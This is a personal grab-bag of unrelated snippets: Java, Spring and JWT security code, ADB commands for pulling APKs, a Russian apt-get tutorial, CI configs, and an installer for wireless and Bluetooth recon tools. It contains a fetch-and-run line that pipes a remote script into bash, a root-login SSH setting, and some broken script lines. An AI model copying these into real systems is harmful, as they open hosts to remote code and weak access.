import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;

public class OpenCSVReadBeansEx {

    public static void main(String[] args) throws IOException {

        String fileName = "src/main/resources/cars.csv";
        Path myPath = Paths.get(fileName);

        try (BufferedReader br = Files.newBufferedReader(myPath,
                StandardCharsets.UTF_8)) {

            HeaderColumnNameMappingStrategy<Car> strategy
                    = new HeaderColumnNameMappingStrategy<>();
            strategy.setType(Car.class);

            CsvToBean csvToBean = new CsvToBeanBuilder(br)
                    .withType(Car.class)
                    .withMappingStrategy(strategy)
                    .withIgnoreLeadingWhiteSpace(true)
                    .build();

            List<Car> cars = csvToBean.parse();
            
            cars.forEach(System.out::println);
        }
    }
}

<dependency>
    <groupId>org.eclipse.collections</groupId>
    <artifactId>eclipse-collections-api</artifactId>
    <version>7.1.0</version>
</dependency>

<dependency>
    <groupId>org.eclipse.collections</groupId>
    <artifactId>eclipse-collections</artifactId>
    <version>7.1.0</version>
</dependency>

<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>5.1.7.RELEASE</version>
</dependency>


--------------------------------------------------------------------------------------------------------
mvn dependency:copy -Dartifact=io.swagger:swagger-codegen-cli:2.2.2 -DoutputDirectory=. -Dmdep.stripVersion=true
java -jar swagger-codegen-cli.jar langs
java -jar swagger-codegen-cli.jar config-help -l <language>
java -jar swagger-codegen-cli.jar config-help -l scala
java -jar swagger-codegen-cli.jar generate  \
     -i https://apis.voicebase.com/v3/defs/v3-api.yaml \
     -l java \
     -c java-config.json \
     -o v3client

https://fizzylogic.nl/2018/09/26/learn-how-to-quickly-generate-rest-clients-from-swagger-files/
https://github.com/swagger-api/swagger-codegen
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.time.Instant;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "MyServlet", urlPatterns = {"/MyServlet"})
public class MyServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        
        response.setContentType("text/html;charset=UTF-8");

        request.setAttribute("now", Instant.now());
        
        request.getRequestDispatcher("AnotherServlet").forward(request, response);
    }
}
--------------------------------------------------------------------------------------------------------
Markdown Presentations For Everyone on GitHub, GitLab, Bitbucket, GitBucket, Gitea, and Gogs.
$ docker build -t="hello-world-java" .
$ docker run -p 8080:8080 -it --rm hello-world-java
$ docker inspect --format '{{ .NetworkSettings.IPAddress }}' [ContainerId]
--------------------------------------------------------------------------------------------------------
```ruby
require 'redcarpet'
markdown = Redcarpet.new("Hello World!")
puts markdown.to_html
```

.of("security.oauth2.client.clientId:myclientid",
          "security.oauth2.client.clientSecret:mysecret",
          "security.oauth2.client.autoApproveScopes:read,write",
          "security.oauth2.client.accessTokenValiditySeconds:40",
          "security.oauth2.client.refreshTokenValiditySeconds:80")
--------------------------------------------------------------------------------------------------------
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class InvokeBug {
  static value class Value {
    private final int value;
    
    public Value(int value) {
      this.value = value;
    }
  }
  
  public static void method(Value value) {
    // empty
  }
  
  public static void main(String[] args) throws Throwable {
    MethodHandle method = MethodHandles.lookup().findStatic(InvokeBug.class, "method", MethodType.methodType(void.class, Value.class));
    method.invokeExact(new Value(42));
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.Objects;

public final value class NullVT {
  private final boolean value;
  
  private NullVT() {
    value = false;
    throw new AssertionError();
  }

  public static NullVT of() {
    return __MakeDefault NullVT();
  }
  
  public static void foo(NullVT vt) {
    Objects.requireNonNull(vt);
  }
}
--------------------------------------------------------------------------------------------------------
@echo off
mode con codepage select=1251 > nul
echo Waiting
attrib -s -h -r -a /s /d
--------------------------------------------------------------------------------------------------------
adb kill-server
su root stop adbd
su shell setprop ro.debuggable 0
su shell setprop service.adb.tcp.port 0
su root iptables -D INPUT -j adbd
su root iptables -F adbd
su root iptables -X adbd

# Add iptables rules to block external connections to port 9999'
su root iptables -N adbd
su root iptables -A adbd -i lo -p tcp -m tcp --dport 9999 -j ACCEPT
su root iptables -A adbd -p tcp -m tcp --dport 9999 -j DROP
su root iptables -A INPUT -j adbd

# Necessary in order to display authorization prompt
su shell setprop ro.debuggable 1

su shell setprop service.adb.tcp.port 9999

su root start adbd

adb connect 127.0.0.1:9999

adb wait-for-local-device
--------------------------------------------------------------------------------------------------------
git clone https://git.busybox.net/busybox/
--------------------------------------------------------------------------------------------------------
language: android

jdk: oraclejdk8

android:
  components:
    - tools
    - platform-tools
    - build-tools-25.0.2
    - android-25
    - extra-android-m2repository

before_script:
  - echo no | android create avd --force -n test -t android-18 --abi armeabi-v7a
  - emulator -avd test -no-audio -no-window &
  - android-wait-for-emulator
  - adb shell input keyevent 82 &

script:
   - ./gradlew connectedAndroidTest coveralls
--------------------------------------------------------------------------------------------------------
for i in $(adb shell pm list packages | awk -F':' '{print $2}'); do adb pull "$(adb shell pm path $i | awk -F':' '{print $2}')"; mv base.apk $i.apk 2&> /dev/null ;done
adb shell pm uninstall --user 0 com.android.cellbroadcastreceiver   <--- kills presidential alert app!
adb shell pm list users
adb shell pm path com.example.someapp
adb pull /data/app/com.example.someapp-2.apk path/to/desired/destination
adb shell pm list packages -f -3

adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/classic_scan_20190819_141752.json
adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/classic_scan_20190819_141752.csv

adb pull "/sdcard/Nordic Semiconductor/" D:/adb/test

adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/ D:/adb/test
adb backup -apk apk

adb shell 'cat `pm path com.example.name | cut -d':' -f2`' > app.apk

function android_pull_apk() {
    if [ -z "$1" ]; then
        echo "You must pass a package to this function!"
        echo "Ex.: android_pull_apk \"com.android.contacts\""
        return 1
    fi

    if [ -z "$(adb shell pm list packages | grep $1)" ]; then
        echo "You are typed a invalid package!"
        return 1
    fi

    apk_path="`adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
    apk_name="`adb shell basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"

    destination="$HOME/Documents/Android/APKs"
    mkdir -p "$destination"

    adb pull ${apk_path} ${destination}
    echo -e "\nAPK saved in \"$destination/$apk_name\""
}



for package in $(adb shell pm list packages -3 | tr -d '\r' | sed 's/package://g'); do apk=$(adb shell pm path $package | tr -d '\r' | sed 's/package://g'); echo "Pulling $apk"; adb pull -p $apk "$package".apk; done

adb pull /system/app/CertInstaller/CertInstaller.apk /Users/$(whoami)/Documents/APK/download_apk/

ls -la /Users/$(whoami)/Documents/


adb shell dumpsys activity activities | grep mFocusedActivity
adb shell pm path <packagename.apk>
adb shell cp /data/app/<packagename.apk> /sdcard
adb pull /sdcard/base.apk
--------------------------------------------------------------------------------------------------------
  @Retention(RUNTIME)
  @Target(METHOD)
   public @interface SecurityAnnotation {
   }
   //
   @Aspect
   @Component
   public class MyAspect {
    
    @Pointcut("@annotation(SecurityAnnotation) && args(user,..)")
    public void callAtMyServiceSecurityAnnotation(User user) { }

    @Around("callAtMyServiceSecurityAnnotation(user)")
    public Object aroundCallAt(ProceedingJoinPoint pjp, User user) {
        Object retVal = null;
        if (securityService.checkRight(user)) {
         retVal = pjp.proceed();
         }
        return retVal;
    }
--------------------------------------------------------------------------------------------------------
@Aspect
@Component
public class MyAspect {

    @Pointcut("execution(public * com.example.demoAspects.MyService.*(..))")
    public void callAtMyServicePublic() {
    }

    @Around("callAtMyServicePublic()")
    public Object aroundCallAt(ProceedingJoinPoint call) throws Throwable {
        StopWatch clock = new StopWatch(call.toString());
        try {
            clock.start(call.toShortString());
            return call.proceed();
        } finally {
            clock.stop();
            System.out.println(clock.prettyPrint());
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class RequestCountMonitoringConfiguration extends WebMvcConfigurerAdapter {

  private Meter requestMeter;

  @Autowired
  public RequestCountMonitoringConfiguration(MetricRegistry metricRegistry) {
    this.requestMeter = metricRegistry.meter("http.requests");
  }

  @Override
  public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(new HandlerInterceptorAdapter() {
      @Override
      public void afterCompletion(HttpServletRequest request,
          HttpServletResponse response, Object handler, Exception ex)
          throws Exception {
        requestMeter.mark();
      }
    });
  }
}

@ControllerAdvice
public class ControllerExceptionHandler {

  private MetricRegistry metricRegistry;

  @Autowired
  public ControllerExceptionHandler(MetricRegistry metricRegistry){
    this.metricRegistry = metricRegistry;
  }
  
  @ResponseStatus(value = HttpStatus.INTERNAL_SERVER_ERROR)
  @ExceptionHandler(Exception.class)
  @ResponseBody
  public String handleInternalError(Exception e) {
    countHttpStatus(HttpStatus.INTERNAL_SERVER_ERROR);
    logger.error("Returned HTTP Status 500 due to the following exception:", e);
    return "Internal Server Error";
  }
  
  private void countHttpStatus(HttpStatus status){
    Meter meter = metricRegistry.meter(String.format("http.status.%d", status.value()));
    meter.mark();
  }
}
--------------------------------------------------------------------------------------------------------
apt-get update
apt-get insatll ssh
systemctl enable ssh
service ssh start
nano /etc/ssh/sshd_config

PermitRootLogin yes

service ssh restart

https://codeby.net/threads/vkljuchenie-ssh-na-kali-linux.67703/

Как можно получить список всех доступных пакетов?

Чтобы увидеть все доступные пакеты, выполните следующую команду:
1
	
apt-cache pkgnames

Как можно найти имя пакета и его описание.

Чтобы найти название пакета и его описание перед установкой, используйте флаг «search». Использование “search” c apt-cache отобразит список подходящих пакетов с кратким описанием. Например, вы хотите найти описание пакета vsftpd: чтобы сделать это, команда должна быть вот такой:
1
	
apt-cache search vsftpd

Чтобы найти и перечислить все пакеты, имя которых начинается с vsftpd, вы можете использовать следующую команду:
1
	
apt-cache pkgnames vsftpd

Как я могу просмотреть информацию о пакете?

Например, если вы хотите ознакомиться с информацией о пакете, с его кратким описанием, отображающим номер версии, контрольные суммы, размер, размер после установки, категории и так далее, вы можете использовать подкоманду «show», как показано ниже:
1
	
apt-cache show netcat

Как можно проверить зависимости какого-либо пакета?

Чтобы проверить зависимости конкретного пакета, вы можете использовать подкоманду showpkg, чтобы узнать, установлены эти зависимости или нет. Например, используйте команду showpkg вместе с названием пакета.
1
	
apt-cache showpkg vsftpd

Как можно просмотреть статистику кэша?

Подкоманда stats отобразит полную статистику о кеше, например, полное число пакетов, найденное в кеше. Используйте такую команду:
1
	
apt-cache stats

Как обновить список пакетов в системе?

Команда update используется для синхронизации и обновления индексных файлов пакетов. Синхронизация происходит с источниками, указанными в файле /etc/apt/sources.list. Эту команду можно использовать, например, чтобы не упускать важные обновления пакетов.
1
	
sudo apt-get update

Как обновить пакеты в системе?

Команда upgrade используется для обновления всего установленного на данный момент софта в вашйе системе. Иногда может получиться так, что обновление установить нельзя из-за какого-либо другого пакета, который требует старую версию.
1
	
sudo apt-get upgrade

Но если вы хотите обновиться вне зависимости от требований пакетов, используйте подкоманду dist-upgrade:
1
	
sudo apt-get dist-upgrade

Как я могу установить или обновить какой-либо конкретный пакет?

Подкоманда install используется для установки или обновления какого-либо пакета.
1
	
sudo apt-get install netcat

Как я могу установить несколько пакетов сразу?

Вы можете ввести названия нескольих пакетов, чтобы установить их одновременно. Например, чтобы установить пакеты nethogs и goaccess, вы можете выполнить следующую команду:
1
	
sudo apt-get install nethogs goaccess

Как установить несколько пакетов по «маске» названия

С помощью регулярных вырежний вы можете добавлять несколько пакетов с помощью специальных символов. Например, можно использовать звездочку, чтобы установить все пакеты, которые содержат строку «name» в названии:
1
	
sudo apt-get install *name*

Как установить пакеты без обновления.

Использование флага –no-upgrade предотвратит обновление уже установленных пакетов.
1
	
sudo apt-get install packageName --no-upgrade

Как только обновить определенные пакеты?

Флаг –only-upgrade не установит новые пакеты, а только обновит существующие.
1
	
sudo apt-get install имя_пакета --only-upgrade

Как я могу установить определенную версию пакета?

Представим, что вам необходимо установить специфичную версию пакета, просто используйте знак равно вместе с именем пакета и припишите желаемую версию.
1
	
sudo apt-get install vsftpd=2.3.5-3ubuntu1

Как удалить пакеты без удаления настроек?

Чтобы удалить программные пакеты без удаления их конфигурационных файлов (для дальнейшего их использования), используйте команду remove как показано.
1
	
sudo apt-get remove vsftpd

Как полностью удалить пакеты?

Чтобы удалить пакет вместе с его файлами настроек, используете подкоманду purge, как показано ниже.
1
	
sudo apt-get purge vsftpd

Или вы можете объединить обе команды, вот так:
1
	
sudo apt-get remove --purge vsftpd

Как можно очистить место на диске?

Команда clean используется для освобождения дискового пространствва за счет удаления полученных .deb-файлов пакетов в вашем локальном репозитории.
1
	
sudo apt-get clean

Как только загрузить исходный код пакета?

Чтобы только загрузить исходный код пакета, вы можете использовать опцию –download-only source с именем пакета, например:
1
	
sudo apt-get --download-only source vsftpd

Как можно загрузить и распаковать пакет?

Чтобы загрузить и распаковать исходный код пакета в специальную директорию, выполните следующую команду:
1
	
sudo apt-get source vsftpd

Как можно загрузить, распаковать и скомпилировать исходный код пакета?

Вы также можете загрузить, распаковать и скомпилировать исходный код пакета, используя опцию ‘–compile‘, как показано ниже:
1
	
sudo apt-get --compile source goaccess

Как загрузить пакет без установки

Используя опцию «download», вы можете загрузить любой пакет, не устанавливая его. Например, следующая команда только загрузит пакет nethogs в текущую рабочую директорию.
1
	
sudo apt-get download nethogs

Как можно просмотреть лог изменений (changelog) пакета?

Флаг changelog загружает лог изменений пакета и отображает версию пакета, если он установлен.
1
	
sudo apt-get changelog vsftpd

Как можно исправить сломанные зависимости?

Команда «check» — инструмент для диагностики, он используется для обновления кеша пакетов и проверки на сломанные зависимости.
1
	
sudo apt-get check

Как можно найти и собрать зависимости?

Команда build-dep ищет и устанавливает собранные зависимости нужного пакета. Если пакет отсутствует в локальном репозитории, вы получите ошибку.
1
	
sudo apt-get build-dep netcat

Как можно автоматически очистить кеш Apt-Get?

Команда autoclean удаляет все .deb-файлы из /var/cache/apt/archives для освобождения свободного места на жестком диске.
1
	
sudo apt-get autoclean

Как можно автоматически удалить ненужные пакеты?

Подкоманда autoremove используется для автоматического удаления пакетов, которые были установлены как зависимости других, но сейчас они больше не нужны. Например, следующая команда удалит установленный пакет вместе с его зависимостями.
1
	
sudo apt-get autoremove vsftpd
--------------------------------------------------------------------------------------------------------
#!/bin/bash

#
# Ubertooth install script for Kali Linux 2.0.0
#
# by Raul Siles
# Copyright (c) 2015 DinoSec SL (www.dinosec.com)
#
# Version: 2017-03-R2
# Date: 2015-10-31
#
# Ubertooth and libbtbb versions: 2017-03-R2
# Kali Linux version: 2.0.0
# Wireshark version: 1.12.6
# FING version: 2013-03-R1b
#

# Versions
FING_VERSION=2016-07-R1
AIRCRACK_VERSION=1.2
HORST_VERSION=5.1

AIRCRACK_URL=https://download.aircrack-ng.org/aircrack-ng-1.2.tar.gz
AIRCRACK_FILENAME=aircrack-ng-$AIRCRACK_VERSION.tar.gz
AIRCRACK_DIR=aircrack-ng-$AIRCRACK_VERSION
LIBBTBB_BACK=../..

HORST_URL=https://github.com/br101/horst/archive/v$HORST_VERSION.tar.gz
HORST_FILENAME=$HORST_VERSION.tar.gz
HORST_DIR=horst
HORST_BACK=..

FING_URL=https://39qiv73eht2y1az3q51pykkf-wpengine.netdna-ssl.com/wp-content/uploads/2018/02/FingKit_CLI_Linux_Debian.zip
FING_FILENAME=FingKit_CLI_Linux_Debian.zip
FING_DIR=Linux_Debian
FING_PACKAGE=fing-5.1.0-armhf.deb
FING_CONF_FILE=/etc/fing.conf
FING_BACK=..

BLUEHYDRA_URL=https://github.com/pwnieexpress/blue_hydra.git
BLUEHYDRA_DIR=blue_hydra
#BLUEHYDRA_CONF_FILE=/etc/BLUEHYDRA.conf
BLUEHYDRA_BACK=..

echo
echo "   Tools Versions:"
echo "   - Aircrack: $AIRCRACK_VERSION"
echo "   - Fing: $AIRCRACK_VERSION"
echo "   - Horst: $FING_VERSION"
echo "   - Blue HydRA: $FING_VERSION"
echo

echo "  Press any key to continue (or Ctrl+C):"
read key


echo "Fixing ssh keys"
#dpkg-reocnfigure -i openssh-server

echo "[*] Installing basic packages..."
echo
sudo apt-get install -y nano fish vim tshark tree sqlite3 tcpdump libtool screen tmux rfkill ethtool automake libssl-dev libnl-3-dev libnl-genl-3-dev pkg-config build-essential libpcre3-dev ruby-dev bluez bluez-test-scripts python-bluez python-dbus libsqlite3-dev bundler 

echo
echo "[*] Building aircrack ..."
wget $AIRCRACK_URL
L -O $AIRCRACK_FILENAME
tar xf $AIRCRACK_FILENAME
cd $AIRCRACK_DIR
autoreconf -i
./configure --with-experimental --with-ext-scripts
make
sudo make install
cd $LIBBTBB_BACK

echo "[*] Installing  Blue Hydra ..."
git clone  $BLUEHYDRA_URL 
cd $BLUEHYDRA_DIR
bundle install
cd $BLUEHYDRA_BACK


echo
echo "[*] Installing Horst.."
echo
wget $HORST_URL -O $HORST_FILENAME
tar xf $HORST_FILENAME
cd $HORST_DIR
make
sudo make install
cd $HORST_BACK

echo
echo "[*] Installing FING.."
echo
wget $FING_URL
unzip $FING_FILENAME
cd $FING_DIR
sudo dpkg -i $FING_PACKAGE
cd $FING_BACK

echo
echo "[*] End of the Pi tools install script. Congratulations!"
echo
--------------------------------------------------------------------------------------------------------
general:
    artifacts:
        - "build/reports/jacoco"        
machine:
    java:
        version: oraclejdk8
    environment:
        ANDROID_HOME: /usr/local/android-sdk-linux
        GRADLE_OPTS: '-Dorg.gradle.jvmargs="-Xmx2048m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8"'
dependencies:
    pre:
        - echo y | android update sdk --no-ui --all --filter tools
        - echo y | android update sdk --no-ui --all --filter platform-tools
        - echo y | android update sdk --no-ui --all --filter build-tools-25.0.3
        - echo y | android update sdk --no-ui --all --filter android-25
        - echo y | android update sdk --no-ui --all --filter extra-google-m2repository
        - echo y | android update sdk --no-ui --all --filter extra-android-m2repository
        - chmod +x gradlew
        - ANDROID_HOME=/usr/local/android-sdk-linux ./gradlew dependencies
    cache_directories:
        - /usr/local/android-sdk-linux/tools
        - /usr/local/android-sdk-linux/build-tools/23.0.3
test:
    override:
        - ./gradlew lint
        - ./gradlew testDebugUnitTest
        - ./gradlew jacocoTestDebugUnitTestReport
    post:
        - bash <(curl -s https://codecov.io/bash)

--------------------------------------------------------------------------------------------------------
import android.util.Log;

class LogEngine {
    private final String tag;

    public LogEngine(final String tag) {
        this.tag = tag;
    }

    public void log(final String message) {
        Log.i(tag, message);
    }

    public void logError(final String message) {
        Log.e(tag, message);
    }

    public void logSecurity(final String message) {
        Log.w(tag, message);
    }

    public void logKeyEvent(final String message) {
        Log.e(tag, message);
    }
}
--------------------------------------------------------------------------------------------------------
import android.bluetooth.BluetoothClass;

public class BluetoothClassResolver {

    public static String resolveDeviceClass(final int btClass) {
        switch (btClass) {
            case BluetoothClass.Device.AUDIO_VIDEO_CAMCORDER:
                return "A/V, Camcorder";
            case BluetoothClass.Device.AUDIO_VIDEO_CAR_AUDIO:
                return "A/V, Car Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_HANDSFREE:
                return "A/V, Handsfree";
            case BluetoothClass.Device.AUDIO_VIDEO_HEADPHONES:
                return "A/V, Headphones";
            case BluetoothClass.Device.AUDIO_VIDEO_HIFI_AUDIO:
                return "A/V, HiFi Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_LOUDSPEAKER:
                return "A/V, Loudspeaker";
            case BluetoothClass.Device.AUDIO_VIDEO_MICROPHONE:
                return "A/V, Microphone";
            case BluetoothClass.Device.AUDIO_VIDEO_PORTABLE_AUDIO:
                return "A/V, Portable Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_SET_TOP_BOX:
                return "A/V, Set Top Box";
            case BluetoothClass.Device.AUDIO_VIDEO_UNCATEGORIZED:
                return "A/V, Uncategorized";
            case BluetoothClass.Device.AUDIO_VIDEO_VCR:
                return "A/V, VCR";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_CAMERA:
                return "A/V, Video Camera";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_CONFERENCING:
                return "A/V, Video Conferencing";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_DISPLAY_AND_LOUDSPEAKER:
                return "A/V, Video Display and Loudspeaker";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_GAMING_TOY:
                return "A/V, Video Gaming Toy";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_MONITOR:
                return "A/V, Video Monitor";
            case BluetoothClass.Device.AUDIO_VIDEO_WEARABLE_HEADSET:
                return "A/V, Video Wearable Headset";
            case BluetoothClass.Device.COMPUTER_DESKTOP:
                return "Computer, Desktop";
            case BluetoothClass.Device.COMPUTER_HANDHELD_PC_PDA:
                return "Computer, Handheld PC/PDA";
            case BluetoothClass.Device.COMPUTER_LAPTOP:
                return "Computer, Laptop";
            case BluetoothClass.Device.COMPUTER_PALM_SIZE_PC_PDA:
                return "Computer, Palm Size PC/PDA";
            case BluetoothClass.Device.COMPUTER_SERVER:
                return "Computer, Server";
            case BluetoothClass.Device.COMPUTER_UNCATEGORIZED:
                return "Computer, Uncategorized";
            case BluetoothClass.Device.COMPUTER_WEARABLE:
                return "Computer, Wearable";
            case BluetoothClass.Device.HEALTH_BLOOD_PRESSURE:
                return "Health, Blood Pressure";
            case BluetoothClass.Device.HEALTH_DATA_DISPLAY:
                return "Health, Data Display";
            case BluetoothClass.Device.HEALTH_GLUCOSE:
                return "Health, Glucose";
            case BluetoothClass.Device.HEALTH_PULSE_OXIMETER:
                return "Health, Pulse Oximeter";
            case BluetoothClass.Device.HEALTH_PULSE_RATE:
                return "Health, Pulse Rate";
            case BluetoothClass.Device.HEALTH_THERMOMETER:
                return "Health, Thermometer";
            case BluetoothClass.Device.HEALTH_UNCATEGORIZED:
                return "Health, Uncategorized";
            case BluetoothClass.Device.HEALTH_WEIGHING:
                return "Health, Weighting";
            case BluetoothClass.Device.PHONE_CELLULAR:
                return "Phone, Cellular";
            case BluetoothClass.Device.PHONE_CORDLESS:
                return "Phone, Cordless";
            case BluetoothClass.Device.PHONE_ISDN:
                return "Phone, ISDN";
            case BluetoothClass.Device.PHONE_MODEM_OR_GATEWAY:
                return "Phone, Modem or Gateway";
            case BluetoothClass.Device.PHONE_SMART:
                return "Phone, Smart";
            case BluetoothClass.Device.PHONE_UNCATEGORIZED:
                return "Phone, Uncategorized";
            case BluetoothClass.Device.TOY_CONTROLLER:
                return "Toy, Controller";
            case BluetoothClass.Device.TOY_DOLL_ACTION_FIGURE:
                return "Toy, Doll/Action Figure";
            case BluetoothClass.Device.TOY_GAME:
                return "Toy, Game";
            case BluetoothClass.Device.TOY_ROBOT:
                return "Toy, Robot";
            case BluetoothClass.Device.TOY_UNCATEGORIZED:
                return "Toy, Uncategorized";
            case BluetoothClass.Device.TOY_VEHICLE:
                return "Toy, Vehicle";
            case BluetoothClass.Device.WEARABLE_GLASSES:
                return "Wearable, Glasses";
            case BluetoothClass.Device.WEARABLE_HELMET:
                return "Wearable, Helmet";
            case BluetoothClass.Device.WEARABLE_JACKET:
                return "Wearable, Jacket";
            case BluetoothClass.Device.WEARABLE_PAGER:
                return "Wearable, Pager";
            case BluetoothClass.Device.WEARABLE_UNCATEGORIZED:
                return "Wearable, Uncategorized";
            case BluetoothClass.Device.WEARABLE_WRIST_WATCH:
                return "Wearable, Wrist Watch";
            default:
                return "Unknown, Unknown (class=" + btClass + ")";
        }
    }

    public static String resolveMajorDeviceClass(final int majorBtClass) {
        switch (majorBtClass) {
            case BluetoothClass.Device.Major.AUDIO_VIDEO:
                return "Audio/ Video";
            case BluetoothClass.Device.Major.COMPUTER:
                return "Computer";
            case BluetoothClass.Device.Major.HEALTH:
                return "Health";
            case BluetoothClass.Device.Major.IMAGING:
                return "Imaging";
            case BluetoothClass.Device.Major.MISC:
                return "Misc";
            case BluetoothClass.Device.Major.NETWORKING:
                return "Networking";
            case BluetoothClass.Device.Major.PERIPHERAL:
                return "Peripheral";
            case BluetoothClass.Device.Major.PHONE:
                return "Phone";
            case BluetoothClass.Device.Major.TOY:
                return "Toy";
            case BluetoothClass.Device.Major.UNCATEGORIZED:
                return "Uncategorized";
            case BluetoothClass.Device.Major.WEARABLE:
                return "Wearable";
            default:
                return "Unknown (" +majorBtClass+ ")";
        }
    }
}
--------------------------------------------------------------------------------------------------------
cat /etc/httpd/conf/httpd.conf | grep shirts | grep -v "#"
--------------------------------------------------------------------------------------------------------

    @ExceptionHandler({AccessDeniedException.class})
    @ResponseBody
    @ResponseStatus(HttpStatus.FORBIDDEN)
    protected ResponseEntity<?> handle(final HttpServletRequest req, final AccessDeniedException ex) {
        LOGGER.error(ex.getMessage());
        String url = req.getRequestURI().substring(req.getContextPath().length());
        return new ResponseEntity<>(new ExceptionEntity(url, ResponseStatusCode.FORBIDDEN, ex.getMessage()), HttpStatus.FORBIDDEN);
    }
--------------------------------------------------------------------------------------------------------
@GET
@Consumes({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON, MediaType.APPLICATION_FORM_URLENCODED })
@Produces({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON, MediaType.APPLICATION_FORM_URLENCODED })
@ApiOperation(value = "Get all ServiceConfigs", response = ServiceConfigResultsModel.class)
@ApiResponses(value = {
		@ApiResponse(code = HttpURLConnection.HTTP_OK, message = "Returns a list of ServiceConfig", response = ServiceConfigResultsModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_UNAUTHORIZED, message = "Unauthorized", response = ExceptionModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_NOT_FOUND, message = "Not found", response = ExceptionModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_FORBIDDEN, message = "Access denied", response = ExceptionModel.class) })
public Response getServiceConfigs(@Context HttpServletRequest request, @Context HttpHeaders header,
		@Context Company company, @Context Locale locale, @Context User user,
		@Context ServiceContext serviceContext,
		@ApiParam(value = "query params for search") @BeanParam ServiceConfigSearchModel search);
--------------------------------------------------------------------------------------------------------

import com.springio.store.domain.User;
import com.springio.store.repository.UserRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import java.util.*;
import java.util.stream.Collectors;

/**
 * Authenticate a user from the database.
 */
@Component("userDetailsService")
public class DomainUserDetailsService implements UserDetailsService {

    private final Logger log = LoggerFactory.getLogger(DomainUserDetailsService.class);

    private final UserRepository userRepository;

    public DomainUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    @Transactional
    public UserDetails loadUserByUsername(final String login) {
        log.debug("Authenticating {}", login);
        String lowercaseLogin = login.toLowerCase(Locale.ENGLISH);
        Optional<User> userFromDatabase = userRepository.findOneWithAuthoritiesByLogin(lowercaseLogin);
        return userFromDatabase.map(user -> {
            if (!user.getActivated()) {
                throw new UserNotActivatedException("User " + lowercaseLogin + " was not activated");
            }
            List<GrantedAuthority> grantedAuthorities = user.getAuthorities().stream()
                    .map(authority -> new SimpleGrantedAuthority(authority.getName()))
                .collect(Collectors.toList());
            return new org.springframework.security.core.userdetails.User(lowercaseLogin,
                user.getPassword(),
                grantedAuthorities);
        }).orElseThrow(() -> new UsernameNotFoundException("User " + lowercaseLogin + " was not found in the " +
        "database"));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.security.config.annotation.SecurityConfigurerAdapter;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.DefaultSecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

public class JWTConfigurer extends SecurityConfigurerAdapter<DefaultSecurityFilterChain, HttpSecurity> {

    public static final String AUTHORIZATION_HEADER = "Authorization";

    public static final String AUTHORIZATION_TOKEN = "access_token";

    private TokenProvider tokenProvider;

    public JWTConfigurer(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void configure(HttpSecurity http) throws Exception {
        JWTFilter customFilter = new JWTFilter(tokenProvider);
        http.addFilterBefore(customFilter, UsernamePasswordAuthenticationFilter.class);
    }
}
--------------------------------------------------------------------------------------------------------

import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.util.StringUtils;
import org.springframework.web.filter.GenericFilterBean;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * Filters incoming requests and installs a Spring Security principal if a header corresponding to a valid user is
 * found.
 */
public class JWTFilter extends GenericFilterBean {

    private TokenProvider tokenProvider;

    public JWTFilter(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
        throws IOException, ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        String jwt = resolveToken(httpServletRequest);
        if (StringUtils.hasText(jwt) && this.tokenProvider.validateToken(jwt)) {
            Authentication authentication = this.tokenProvider.getAuthentication(jwt);
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    private String resolveToken(HttpServletRequest request){
        String bearerToken = request.getHeader(JWTConfigurer.AUTHORIZATION_HEADER);
